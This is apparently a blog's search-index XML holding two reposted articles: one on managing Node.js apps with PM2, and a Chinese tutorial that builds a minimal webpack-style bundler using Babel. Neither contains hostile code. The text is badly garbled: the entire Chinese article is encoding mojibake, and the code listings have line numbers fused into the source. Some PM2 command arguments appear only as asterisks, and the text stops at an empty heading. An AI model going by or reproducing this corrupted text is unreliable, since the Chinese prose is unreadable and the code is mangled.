<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>%2F2020%2F01%2F15%2FNode.js%2FUntitled%2F</url>
    <content type="text"><![CDATA[Running PM2 &amp; Node.js in Production Environments Nick ParsonsFollow Aug 7, 2018 Â· 6 min read https://getstream.io/try-the-api At Stream, we build a lot of showcase and example applications to show off the awesome features that our service has to offer. For nearly all of our applications, we host them on an instance â€” usually DigitalOcean or AWS EC2. While maintaining your codebase and keeping it relevant is difficult, weâ€™ve found that the most challenging aspect when it comes to maintaining an application is keeping it alive and running. Additionally, with Node.js being the core language for most of our backend APIs, scaling a single threaded process can be hard to do; thatâ€™s where PM2 comes in and why we enjoy using it so much. There are many process managers out there, most notably Forever, StrongLoopâ€™s Process Manager, and good olâ€™ SystemD. And then there is PM2, with over 60 million downloads and 25k GitHub stars (and rising!). We like PM2 because, simply put, itâ€™s easy to use and makes managing a production environment seamless. What is PM2? PM2 is a battle tested, production ready runtime and process manager for Node.js applications. It comes with a built-in load balancer, as well, which makes scaling applications even easier. Best of all, it works on Linux, Windows, and macOS. With a configuration file (process.json), you specify what processes you want to run and how many youâ€™d like to scale to. When starting PM2, you specify the process.json file and PM2 takes care of the rest. (More on process files in a bit ğŸ˜‰) What all of this means is that PM2 allows you to keep your Node.js applications alive forever, and to reload them with zero downtime when you have updates to your application or server. Installing PM2Installing PM2 is a piece of cake. First, youâ€™ll want to make sure that you have your process.json file ready to go in your code so we can kick off the process. If youâ€™re on macOS, installing is as simple as running yarn add global pm2. If youâ€™re on Linux, Windows, or using a Docker container (yes, it supports Docker as well), follow the instructions here. If youâ€™re curious what it should look like, here is an example of our process_prod.json file for Winds, our open-source RSS &amp; Podcast application: As you can see, weâ€™re running several processes, and PM2 handles them without any issues, automatically using the Node.js Cluster API to spawn multiple processes. Tips &amp; TricksWith any application (or process manager in our case), itâ€™s good to know a few tips and tricks from individuals who have previously used it. Auto Restart Once itâ€™s started, your app is forever alive, auto-restarting after crashes and machine restarts â€” all with one simple command: pm2 startup Process Management No matter how many applications youâ€™re running, PM2 has a suite of commands that allow you to manage their respective states. Below are a few of our favorite commands (in no particular order): pm2 start process_prod.json â€” Start process(es) via process JSON file pm2 ls â€” Show a list of all applications pm2 stop **** â€” Stops a specific application pm2 start **** â€” Starts a specific application pm2 ** **scale N â€” Scales the application you specify to N number of instances (can be used to scale up or down) pm2 kill â€” Kills all running applications pm2 restart â€” Restarts all running applications pm2 reload â€” Reloads the app configuration (this comes in handy when you modify your applicationâ€™s environment variables) Process Management Running the command pm2 monit will return a rich set of data around your applicationâ€™s health. For example, youâ€™ll see CPU utilization, memory usage, requests/minute, and more! Log Management PM2 has built-in log management. It aggregates log data from all of your applications and writes it to a single source for viewing. You can even tail the logs in real-time to see whatâ€™s going on behind the scenes with your application. Log Management from PM2 comes with log rotation as well, which is important, especially if youâ€™re application is outputting verbose logs on a frequent basis. There are three commands that I use often, and you should too: pm2 logs â€” Outputs logs from all running applications pm2 logs app â€” Outputs logs from only the app application pm2 flush â€” Flushes all log data, freeing up disk space Remember, the most important thing to do is to enable log rotation. Doing so will split one giant log file into many smaller files that are more manageable for PM2. To do this, run the following command: pm2 install pm2-logrotate More information on Log Management can be found here. If youâ€™re finding that your instance is filling up with logs often, think about using a centralized logging service such as Loggly, Papertrail, or ELK. Best Practices:Generally, I like to abide by the practices outlined in The Twelve-Factor App. They will allow you to use PM2 to its full advantage. If you havenâ€™t read the manifesto, it comes down to these 12 rules: One codebase tracked in revision control, many deploys Explicitly declare and isolate dependencies Store config in the environment Treat backing services as attached resources Strictly separate build and run stages Execute the app as one or more stateless processes Export services via port binding Scale out via the process model Maximize robustness with fast startup and graceful shutdown Keep development, staging, and production as similar as possible Treat logs as event streams Run admin/management tasks as one-off processes If you follow the rules above, youâ€™ll be able to scale any application with PM2 effectively and efficiently with little to no errors. Final ThoughtsAt Stream, weâ€™re all big fans of the open-source community and couldnâ€™t be happier that PM2 is an open-source project. It allows us to focus on building amazing applications without worrying about the massive overhead that is required to keep an application up and running. With that said, thank you PM2! If youâ€™d like to know more about Stream and what we do, have a look at our 5-minute tutorial that walks you through how to use our API to build a scalable newsfeed in just a few lines of code. For those of you reading, I hope you enjoyed this short read and found a couple of tidbits to be helpful. If you have any questions or comments, please leave them in the comments below! Thank you for reading and happy coding! https://medium.com/hackernoon/running-pm2-node-js-in-production-environments-13e703fc108a https://juejin.im/post/5e1c475af265da3e30770143?utm_source=gold_browser_extension]]></content>
  </entry>
  <entry>
    <title><![CDATA[webpackæ‰“åŒ…åŸç† ? çœ‹å®Œè¿™ç¯‡ä½ å°±æ‡‚äº† !]]></title>
    <url>%2F2020%2F01%2F10%2FWeb%E5%89%8D%E7%AB%AF%2Fwebpack%E6%89%93%E5%8C%85%E5%8E%9F%E7%90%86%20%3F%20%E7%9C%8B%E5%AE%8C%E8%BF%99%E7%AF%87%E4%BD%A0%E5%B0%B1%E6%87%82%E4%BA%86%20!%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5e116fce6fb9a047ea7472a6?utm_source=gold_browser_extension å‰è¨€[å®è·µç³»åˆ—] ä¸»è¦æ˜¯è®©æˆ‘ä»¬é€šè¿‡å®è·µå»åŠ æ·±å¯¹ä¸€äº›åŸç†çš„ç†è§£ã€‚ [å®è·µç³»åˆ—]å‰ç«¯è·¯ç”± [å®è·µç³»åˆ—]Babel åŸç† [å®è·µç³»åˆ—]å®è·µè¿™ä¸€æ¬¡,å½»åº•ææ‡‚æµè§ˆå™¨ç¼“å­˜æœºåˆ¶ [å®è·µç³»åˆ—]ä½ èƒ½æ‰‹å†™ä¸€ä¸ª Promise å—ï¼ŸYes I promiseã€‚ æœ‰å…´è¶£çš„åŒå­¦å¯ä»¥å…³æ³¨ [å®è·µç³»åˆ—] ã€‚ æ±‚ star æ±‚ follow~ æœ¬æ–‡é€šè¿‡å®ç°ä¸€ä¸ªç®€å• webpack,æ¥ç†è§£å®ƒçš„æ‰“åŒ…åŸç†,çœ‹å®Œä¸æ‡‚ç›´æ¥ç›˜æˆ‘ !!! webpack ä»€ä¹ˆæ˜¯ webpack ? æœ¬è´¨ä¸Š,webpack æ˜¯ä¸€ä¸ªç°ä»£ JavaScript åº”ç”¨ç¨‹åºçš„é™æ€æ¨¡å—æ‰“åŒ…å™¨(module bundler)ã€‚å½“ webpack å¤„ç†åº”ç”¨ç¨‹åºæ—¶,å®ƒä¼šé€’å½’åœ°æ„å»ºä¸€ä¸ªä¾èµ–å…³ç³»å›¾(dependency graph),å…¶ä¸­åŒ…å«åº”ç”¨ç¨‹åºéœ€è¦çš„æ¯ä¸ªæ¨¡å—,ç„¶åå°†æ‰€æœ‰è¿™äº›æ¨¡å—æ‰“åŒ…æˆä¸€ä¸ªæˆ–å¤šä¸ª bundleã€‚ webpack å°±åƒä¸€æ¡ç”Ÿäº§çº¿,è¦ç»è¿‡ä¸€ç³»åˆ—å¤„ç†æµç¨‹åæ‰èƒ½å°†æºæ–‡ä»¶è½¬æ¢æˆè¾“å‡ºç»“æœã€‚ è¿™æ¡ç”Ÿäº§çº¿ä¸Šçš„æ¯ä¸ªå¤„ç†æµç¨‹çš„èŒè´£éƒ½æ˜¯å•ä¸€çš„,å¤šä¸ªæµç¨‹ä¹‹é—´æœ‰å­˜åœ¨ä¾èµ–å…³ç³»,åªæœ‰å®Œæˆå½“å‰å¤„ç†åæ‰èƒ½äº¤ç»™ä¸‹ä¸€ä¸ªæµç¨‹å»å¤„ç†ã€‚ æ’ä»¶å°±åƒæ˜¯ä¸€ä¸ªæ’å…¥åˆ°ç”Ÿäº§çº¿ä¸­çš„ä¸€ä¸ªåŠŸèƒ½,åœ¨ç‰¹å®šçš„æ—¶æœºå¯¹ç”Ÿäº§çº¿ä¸Šçš„èµ„æºåšå¤„ç†ã€‚webpack é€šè¿‡ Tapable æ¥ç»„ç»‡è¿™æ¡å¤æ‚çš„ç”Ÿäº§çº¿ã€‚ webpack åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šå¹¿æ’­äº‹ä»¶,æ’ä»¶åªéœ€è¦ç›‘å¬å®ƒæ‰€å…³å¿ƒçš„äº‹ä»¶,å°±èƒ½åŠ å…¥åˆ°è¿™æ¡ç”Ÿäº§çº¿ä¸­,å»æ”¹å˜ç”Ÿäº§çº¿çš„è¿ä½œã€‚ webpack çš„äº‹ä»¶æµæœºåˆ¶ä¿è¯äº†æ’ä»¶çš„æœ‰åºæ€§,ä½¿å¾—æ•´ä¸ªç³»ç»Ÿæ‰©å±•æ€§å¾ˆå¥½ã€‚ â€“ æ·±å…¥æµ…å‡º webpack å´æµ©éºŸ webpack æ ¸å¿ƒæ¦‚å¿µEntryå…¥å£èµ·ç‚¹(entry point)æŒ‡ç¤º webpack åº”è¯¥ä½¿ç”¨å“ªä¸ªæ¨¡å—,æ¥ä½œä¸ºæ„å»ºå…¶å†…éƒ¨ä¾èµ–å›¾çš„å¼€å§‹ã€‚ è¿›å…¥å…¥å£èµ·ç‚¹å,webpack ä¼šæ‰¾å‡ºæœ‰å“ªäº›æ¨¡å—å’Œåº“æ˜¯å…¥å£èµ·ç‚¹ï¼ˆç›´æ¥å’Œé—´æ¥ï¼‰ä¾èµ–çš„ã€‚ æ¯ä¸ªä¾èµ–é¡¹éšå³è¢«å¤„ç†,æœ€åè¾“å‡ºåˆ°ç§°ä¹‹ä¸º bundles çš„æ–‡ä»¶ä¸­ã€‚ Outputoutput å±æ€§å‘Šè¯‰ webpack åœ¨å“ªé‡Œè¾“å‡ºå®ƒæ‰€åˆ›å»ºçš„ bundles,ä»¥åŠå¦‚ä½•å‘½åè¿™äº›æ–‡ä»¶,é»˜è®¤å€¼ä¸º ./distã€‚ åŸºæœ¬ä¸Š,æ•´ä¸ªåº”ç”¨ç¨‹åºç»“æ„,éƒ½ä¼šè¢«ç¼–è¯‘åˆ°ä½ æŒ‡å®šçš„è¾“å‡ºè·¯å¾„çš„æ–‡ä»¶å¤¹ä¸­ã€‚ Moduleæ¨¡å—,åœ¨ Webpack é‡Œä¸€åˆ‡çš†æ¨¡å—,ä¸€ä¸ªæ¨¡å—å¯¹åº”ç€ä¸€ä¸ªæ–‡ä»¶ã€‚Webpack ä¼šä»é…ç½®çš„ Entry å¼€å§‹é€’å½’æ‰¾å‡ºæ‰€æœ‰ä¾èµ–çš„æ¨¡å—ã€‚ Chunkä»£ç å—,ä¸€ä¸ª Chunk ç”±å¤šä¸ªæ¨¡å—ç»„åˆè€Œæˆ,ç”¨äºä»£ç åˆå¹¶ä¸åˆ†å‰²ã€‚ Loaderloader è®© webpack èƒ½å¤Ÿå»å¤„ç†é‚£äº›é JavaScript æ–‡ä»¶ï¼ˆwebpack è‡ªèº«åªç†è§£ JavaScriptï¼‰ã€‚ loader å¯ä»¥å°†æ‰€æœ‰ç±»å‹çš„æ–‡ä»¶è½¬æ¢ä¸º webpack èƒ½å¤Ÿå¤„ç†çš„æœ‰æ•ˆæ¨¡å—,ç„¶åä½ å°±å¯ä»¥åˆ©ç”¨ webpack çš„æ‰“åŒ…èƒ½åŠ›,å¯¹å®ƒä»¬è¿›è¡Œå¤„ç†ã€‚ æœ¬è´¨ä¸Š,webpack loader å°†æ‰€æœ‰ç±»å‹çš„æ–‡ä»¶,è½¬æ¢ä¸ºåº”ç”¨ç¨‹åºçš„ä¾èµ–å›¾ï¼ˆå’Œæœ€ç»ˆçš„ bundleï¼‰å¯ä»¥ç›´æ¥å¼•ç”¨çš„æ¨¡å—ã€‚ Pluginloader è¢«ç”¨äºè½¬æ¢æŸäº›ç±»å‹çš„æ¨¡å—,è€Œæ’ä»¶åˆ™å¯ä»¥ç”¨äºæ‰§è¡ŒèŒƒå›´æ›´å¹¿çš„ä»»åŠ¡ã€‚ æ’ä»¶çš„èŒƒå›´åŒ…æ‹¬,ä»æ‰“åŒ…ä¼˜åŒ–å’Œå‹ç¼©,ä¸€ç›´åˆ°é‡æ–°å®šä¹‰ç¯å¢ƒä¸­çš„å˜é‡ã€‚æ’ä»¶æ¥å£åŠŸèƒ½æå…¶å¼ºå¤§,å¯ä»¥ç”¨æ¥å¤„ç†å„ç§å„æ ·çš„ä»»åŠ¡ã€‚ webpack æ„å»ºæµç¨‹Webpack çš„è¿è¡Œæµç¨‹æ˜¯ä¸€ä¸ªä¸²è¡Œçš„è¿‡ç¨‹,ä»å¯åŠ¨åˆ°ç»“æŸä¼šä¾æ¬¡æ‰§è¡Œä»¥ä¸‹æµç¨‹ : åˆå§‹åŒ–å‚æ•°ï¼šä»é…ç½®æ–‡ä»¶å’Œ Shell è¯­å¥ä¸­è¯»å–ä¸åˆå¹¶å‚æ•°,å¾—å‡ºæœ€ç»ˆçš„å‚æ•°ã€‚ å¼€å§‹ç¼–è¯‘ï¼šç”¨ä¸Šä¸€æ­¥å¾—åˆ°çš„å‚æ•°åˆå§‹åŒ– Compiler å¯¹è±¡,åŠ è½½æ‰€æœ‰é…ç½®çš„æ’ä»¶,æ‰§è¡Œå¯¹è±¡çš„ run æ–¹æ³•å¼€å§‹æ‰§è¡Œç¼–è¯‘ã€‚ ç¡®å®šå…¥å£ï¼šæ ¹æ®é…ç½®ä¸­çš„ entry æ‰¾å‡ºæ‰€æœ‰çš„å…¥å£æ–‡ä»¶ã€‚ ç¼–è¯‘æ¨¡å—ï¼šä»å…¥å£æ–‡ä»¶å‡ºå‘,è°ƒç”¨æ‰€æœ‰é…ç½®çš„ Loader å¯¹æ¨¡å—è¿›è¡Œç¿»è¯‘,å†æ‰¾å‡ºè¯¥æ¨¡å—ä¾èµ–çš„æ¨¡å—,å†é€’å½’æœ¬æ­¥éª¤ç›´åˆ°æ‰€æœ‰å…¥å£ä¾èµ–çš„æ–‡ä»¶éƒ½ç»è¿‡äº†æœ¬æ­¥éª¤çš„å¤„ç†ã€‚ å®Œæˆæ¨¡å—ç¼–è¯‘ï¼šåœ¨ç»è¿‡ç¬¬ 4 æ­¥ä½¿ç”¨ Loader ç¿»è¯‘å®Œæ‰€æœ‰æ¨¡å—å,å¾—åˆ°äº†æ¯ä¸ªæ¨¡å—è¢«ç¿»è¯‘åçš„æœ€ç»ˆå†…å®¹ä»¥åŠå®ƒä»¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ã€‚ è¾“å‡ºèµ„æºï¼šæ ¹æ®å…¥å£å’Œæ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»,ç»„è£…æˆä¸€ä¸ªä¸ªåŒ…å«å¤šä¸ªæ¨¡å—çš„ Chunk,å†æŠŠæ¯ä¸ª Chunk è½¬æ¢æˆä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶åŠ å…¥åˆ°è¾“å‡ºåˆ—è¡¨,è¿™æ­¥æ˜¯å¯ä»¥ä¿®æ”¹è¾“å‡ºå†…å®¹çš„æœ€åæœºä¼šã€‚ è¾“å‡ºå®Œæˆï¼šåœ¨ç¡®å®šå¥½è¾“å‡ºå†…å®¹å,æ ¹æ®é…ç½®ç¡®å®šè¾“å‡ºçš„è·¯å¾„å’Œæ–‡ä»¶å,æŠŠæ–‡ä»¶å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ç³»ç»Ÿã€‚ åœ¨ä»¥ä¸Šè¿‡ç¨‹ä¸­,Webpack ä¼šåœ¨ç‰¹å®šçš„æ—¶é—´ç‚¹å¹¿æ’­å‡ºç‰¹å®šçš„äº‹ä»¶,æ’ä»¶åœ¨ç›‘å¬åˆ°æ„Ÿå…´è¶£çš„äº‹ä»¶åä¼šæ‰§è¡Œç‰¹å®šçš„é€»è¾‘,å¹¶ä¸”æ’ä»¶å¯ä»¥è°ƒç”¨ Webpack æä¾›çš„ API æ”¹å˜ Webpack çš„è¿è¡Œç»“æœã€‚ å®è·µåŠ æ·±ç†è§£,æ’¸ä¸€ä¸ªç®€æ˜“ webpack1. å®šä¹‰ Compiler ç±»1234567891011121314151617class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123;&#125; // é‡å†™ requireå‡½æ•°,è¾“å‡ºbundle generate() &#123;&#125;&#125;å¤åˆ¶ä»£ç  2. è§£æå…¥å£æ–‡ä»¶,è·å– ASTæˆ‘ä»¬è¿™é‡Œä½¿ç”¨@babel/parser,è¿™æ˜¯ babel7 çš„å·¥å…·,æ¥å¸®åŠ©æˆ‘ä»¬åˆ†æå†…éƒ¨çš„è¯­æ³•,åŒ…æ‹¬ es6,è¿”å›ä¸€ä¸ª AST æŠ½è±¡è¯­æ³•æ ‘ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// webpack.config.jsconst path = require('path')module.exports = &#123; entry: './src/index.js', output: &#123; path: path.resolve(__dirname, './dist'), filename: 'main.js' &#125;&#125;//å¤åˆ¶ä»£ç const fs = require('fs')const parser = require('@babel/parser')const options = require('./webpack.config')const Parser = &#123; getAst: path =&gt; &#123; // è¯»å–å…¥å£æ–‡ä»¶ const content = fs.readFileSync(path, 'utf-8') // å°†æ–‡ä»¶å†…å®¹è½¬ä¸ºASTæŠ½è±¡è¯­æ³•æ ‘ return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123; const ast = Parser.getAst(this.entry) &#125; // é‡å†™ requireå‡½æ•°,è¾“å‡ºbundle generate() &#123;&#125;&#125;new Compiler(options).run()å¤åˆ¶ä»£ç  3. æ‰¾å‡ºæ‰€æœ‰ä¾èµ–æ¨¡å—Babel æä¾›äº†@babel/traverse(éå†)æ–¹æ³•ç»´æŠ¤è¿™ AST æ ‘çš„æ•´ä½“çŠ¶æ€,æˆ‘ä»¬è¿™é‡Œä½¿ç”¨å®ƒæ¥å¸®æˆ‘ä»¬æ‰¾å‡ºä¾èµ–æ¨¡å—ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst Parser = &#123; getAst: path =&gt; &#123; // è¯»å–å…¥å£æ–‡ä»¶ const content = fs.readFileSync(path, 'utf-8') // å°†æ–‡ä»¶å†…å®¹è½¬ä¸ºASTæŠ½è±¡è¯­æ³•æ ‘ return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // éå†æ‰€æœ‰çš„ import æ¨¡å—,å­˜å…¥dependecies traverse(ast, &#123; // ç±»å‹ä¸º ImportDeclaration çš„ AST èŠ‚ç‚¹ (å³ä¸ºimport è¯­å¥) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // ä¿å­˜ä¾èµ–æ¨¡å—è·¯å¾„,ä¹‹åç”Ÿæˆä¾èµ–å…³ç³»å›¾éœ€è¦ç”¨åˆ° const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123; const &#123; getAst, getDependecies &#125; = Parser const ast = getAst(this.entry) const dependecies = getDependecies(ast, this.entry) &#125; // é‡å†™ requireå‡½æ•°,è¾“å‡ºbundle generate() &#123;&#125;&#125;new Compiler(options).run()å¤åˆ¶ä»£ç  4. AST è½¬æ¢ä¸º codeå°† AST è¯­æ³•æ ‘è½¬æ¢ä¸ºæµè§ˆå™¨å¯æ‰§è¡Œä»£ç ,æˆ‘ä»¬è¿™é‡Œä½¿ç”¨@babel/core å’Œ @babel/preset-envã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst &#123; transformFromAst &#125; = require('@babel/core')const Parser = &#123; getAst: path =&gt; &#123; // è¯»å–å…¥å£æ–‡ä»¶ const content = fs.readFileSync(path, 'utf-8') // å°†æ–‡ä»¶å†…å®¹è½¬ä¸ºASTæŠ½è±¡è¯­æ³•æ ‘ return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // éå†æ‰€æœ‰çš„ import æ¨¡å—,å­˜å…¥dependecies traverse(ast, &#123; // ç±»å‹ä¸º ImportDeclaration çš„ AST èŠ‚ç‚¹ (å³ä¸ºimport è¯­å¥) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // ä¿å­˜ä¾èµ–æ¨¡å—è·¯å¾„,ä¹‹åç”Ÿæˆä¾èµ–å…³ç³»å›¾éœ€è¦ç”¨åˆ° const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;, getCode: ast =&gt; &#123; // ASTè½¬æ¢ä¸ºcode const &#123; code &#125; = transformFromAst(ast, null, &#123; presets: ['@babel/preset-env'] &#125;) return code &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123; const &#123; getAst, getDependecies, getCode &#125; = Parser const ast = getAst(this.entry) const dependecies = getDependecies(ast, this.entry) const code = getCode(ast) &#125; // é‡å†™ requireå‡½æ•°,è¾“å‡ºbundle generate() &#123;&#125;&#125;new Compiler(options).run()å¤åˆ¶ä»£ç  5. é€’å½’è§£ææ‰€æœ‰ä¾èµ–é¡¹,ç”Ÿæˆä¾èµ–å…³ç³»å›¾123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst &#123; transformFromAst &#125; = require('@babel/core')const Parser = &#123; getAst: path =&gt; &#123; // è¯»å–å…¥å£æ–‡ä»¶ const content = fs.readFileSync(path, 'utf-8') // å°†æ–‡ä»¶å†…å®¹è½¬ä¸ºASTæŠ½è±¡è¯­æ³•æ ‘ return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // éå†æ‰€æœ‰çš„ import æ¨¡å—,å­˜å…¥dependecies traverse(ast, &#123; // ç±»å‹ä¸º ImportDeclaration çš„ AST èŠ‚ç‚¹ (å³ä¸ºimport è¯­å¥) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // ä¿å­˜ä¾èµ–æ¨¡å—è·¯å¾„,ä¹‹åç”Ÿæˆä¾èµ–å…³ç³»å›¾éœ€è¦ç”¨åˆ° const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;, getCode: ast =&gt; &#123; // ASTè½¬æ¢ä¸ºcode const &#123; code &#125; = transformFromAst(ast, null, &#123; presets: ['@babel/preset-env'] &#125;) return code &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123; // è§£æå…¥å£æ–‡ä»¶ const info = this.build(this.entry) this.modules.push(info) this.modules.forEach((&#123; dependecies &#125;) =&gt; &#123; // åˆ¤æ–­æœ‰ä¾èµ–å¯¹è±¡,é€’å½’è§£ææ‰€æœ‰ä¾èµ–é¡¹ if (dependecies) &#123; for (const dependency in dependecies) &#123; this.modules.push(this.build(dependecies[dependency])) &#125; &#125; &#125;) // ç”Ÿæˆä¾èµ–å…³ç³»å›¾ const dependencyGraph = this.modules.reduce( (graph, item) =&gt; (&#123; ...graph, // ä½¿ç”¨æ–‡ä»¶è·¯å¾„ä½œä¸ºæ¯ä¸ªæ¨¡å—çš„å”¯ä¸€æ ‡è¯†ç¬¦,ä¿å­˜å¯¹åº”æ¨¡å—çš„ä¾èµ–å¯¹è±¡å’Œæ–‡ä»¶å†…å®¹ [item.filename]: &#123; dependecies: item.dependecies, code: item.code &#125; &#125;), &#123;&#125; ) &#125; build(filename) &#123; const &#123; getAst, getDependecies, getCode &#125; = Parser const ast = getAst(filename) const dependecies = getDependecies(ast, filename) const code = getCode(ast) return &#123; // æ–‡ä»¶è·¯å¾„,å¯ä»¥ä½œä¸ºæ¯ä¸ªæ¨¡å—çš„å”¯ä¸€æ ‡è¯†ç¬¦ filename, // ä¾èµ–å¯¹è±¡,ä¿å­˜ç€ä¾èµ–æ¨¡å—è·¯å¾„ dependecies, // æ–‡ä»¶å†…å®¹ code &#125; &#125; // é‡å†™ requireå‡½æ•°,è¾“å‡ºbundle generate() &#123;&#125;&#125;new Compiler(options).run()å¤åˆ¶ä»£ç  6. é‡å†™ require å‡½æ•°,è¾“å‡º bundle123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst &#123; transformFromAst &#125; = require('@babel/core')const Parser = &#123; getAst: path =&gt; &#123; // è¯»å–å…¥å£æ–‡ä»¶ const content = fs.readFileSync(path, 'utf-8') // å°†æ–‡ä»¶å†…å®¹è½¬ä¸ºASTæŠ½è±¡è¯­æ³•æ ‘ return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // éå†æ‰€æœ‰çš„ import æ¨¡å—,å­˜å…¥dependecies traverse(ast, &#123; // ç±»å‹ä¸º ImportDeclaration çš„ AST èŠ‚ç‚¹ (å³ä¸ºimport è¯­å¥) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // ä¿å­˜ä¾èµ–æ¨¡å—è·¯å¾„,ä¹‹åç”Ÿæˆä¾èµ–å…³ç³»å›¾éœ€è¦ç”¨åˆ° const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;, getCode: ast =&gt; &#123; // ASTè½¬æ¢ä¸ºcode const &#123; code &#125; = transformFromAst(ast, null, &#123; presets: ['@babel/preset-env'] &#125;) return code &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123; // è§£æå…¥å£æ–‡ä»¶ const info = this.build(this.entry) this.modules.push(info) this.modules.forEach((&#123; dependecies &#125;) =&gt; &#123; // åˆ¤æ–­æœ‰ä¾èµ–å¯¹è±¡,é€’å½’è§£ææ‰€æœ‰ä¾èµ–é¡¹ if (dependecies) &#123; for (const dependency in dependecies) &#123; this.modules.push(this.build(dependecies[dependency])) &#125; &#125; &#125;) // ç”Ÿæˆä¾èµ–å…³ç³»å›¾ const dependencyGraph = this.modules.reduce( (graph, item) =&gt; (&#123; ...graph, // ä½¿ç”¨æ–‡ä»¶è·¯å¾„ä½œä¸ºæ¯ä¸ªæ¨¡å—çš„å”¯ä¸€æ ‡è¯†ç¬¦,ä¿å­˜å¯¹åº”æ¨¡å—çš„ä¾èµ–å¯¹è±¡å’Œæ–‡ä»¶å†…å®¹ [item.filename]: &#123; dependecies: item.dependecies, code: item.code &#125; &#125;), &#123;&#125; ) this.generate(dependencyGraph) &#125; build(filename) &#123; const &#123; getAst, getDependecies, getCode &#125; = Parser const ast = getAst(filename) const dependecies = getDependecies(ast, filename) const code = getCode(ast) return &#123; // æ–‡ä»¶è·¯å¾„,å¯ä»¥ä½œä¸ºæ¯ä¸ªæ¨¡å—çš„å”¯ä¸€æ ‡è¯†ç¬¦ filename, // ä¾èµ–å¯¹è±¡,ä¿å­˜ç€ä¾èµ–æ¨¡å—è·¯å¾„ dependecies, // æ–‡ä»¶å†…å®¹ code &#125; &#125; // é‡å†™ requireå‡½æ•° (æµè§ˆå™¨ä¸èƒ½è¯†åˆ«commonjsè¯­æ³•),è¾“å‡ºbundle generate(code) &#123; // è¾“å‡ºæ–‡ä»¶è·¯å¾„ const filePath = path.join(this.output.path, this.output.filename) // æ‡µé€¼äº†å—? æ²¡äº‹,ä¸‹ä¸€èŠ‚æˆ‘ä»¬æ‹ä¸€æ‹ const bundle = `(function(graph)&#123; function require(module)&#123; function localRequire(relativePath)&#123; return require(graph[module].dependecies[relativePath]) &#125; var exports = &#123;&#125;; (function(require,exports,code)&#123; eval(code) &#125;)(localRequire,exports,graph[module].code); return exports; &#125; require('$&#123;this.entry&#125;') &#125;)($&#123;JSON.stringify(code)&#125;)` // æŠŠæ–‡ä»¶å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ç³»ç»Ÿ fs.writeFileSync(filePath, bundle, 'utf-8') &#125;&#125;new Compiler(options).run()å¤åˆ¶ä»£ç  7. çœ‹å®Œè¿™èŠ‚,å½»åº•ææ‡‚ bundle 